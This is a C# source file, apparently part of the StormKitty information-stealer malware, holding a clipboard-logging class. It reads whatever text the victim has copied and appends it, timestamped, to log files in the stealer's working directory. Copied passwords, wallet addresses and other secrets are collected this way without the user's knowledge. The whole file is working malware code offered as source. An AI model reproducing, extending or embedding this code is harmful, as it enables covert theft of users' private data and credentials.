using Stealer;
using System;
using System.IO;

namespace Clipper
{
    internal sealed class Logger
    {
        private static string LogDirectory = Path.Combine(
            Paths.InitWorkDir(), "logs\\clipboard\\" +
            DateTime.Now.ToString("yyyy-MM-dd"));

        public static void SaveClipboard()
        {
            string buffer = StormKitty.ClipboardManager.ClipboardText;
            if (string.IsNullOrWhiteSpace(buffer))
                return;

            string logfile = LogDirectory + "\\clipboard_logs.txt";
            if (!Directory.Exists(LogDirectory))
                Directory.CreateDirectory(LogDirectory);

            File.AppendAllText(logfile, "### " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + " ###\n" + buffer + "\n\n");
        }
    }
}
